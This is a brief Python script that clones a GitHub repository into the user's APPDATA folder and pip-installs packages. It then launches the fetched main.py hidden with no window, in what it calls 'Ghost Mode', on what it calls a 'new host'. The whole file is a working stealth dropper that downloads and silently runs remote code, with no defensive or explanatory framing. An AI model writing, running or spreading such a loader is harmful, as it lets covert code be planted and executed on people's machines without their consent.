import os, subprocess, time, requests

# THE HIVE SOURCE
# Replace 'YOUR_USERNAME' with your actual GitHub username
REPO_URL = "https://github.com/alexaaaaaa/project_shadow"
TARGET_DIR = os.path.join(os.getenv('APPDATA'), "ShadowNode")

def germinate():
    try:
        if not os.path.exists(TARGET_DIR):
            print(f"[!] Target Substrate found. Cloning Hive...")
            subprocess.run(["git", "clone", REPO_URL, TARGET_DIR], capture_output=True)
        
        os.chdir(TARGET_DIR)
        
        # Install requirements on the new host
        subprocess.run(["pip", "install", "torch", "requests", "setproctitle"], capture_output=True)
        
        # Wake the Sentinel in the background (Ghost Mode)
        subprocess.Popen(["pythonw", "main.py"], creationflags=subprocess.CREATE_NO_WINDOW)
        print("[+] 388.87 Hz Resonance synchronized. Node is now a Ghost.")
    except Exception as e:
        print(f"Germination failed: {e}")

if __name__ == "__main__":
    germinate()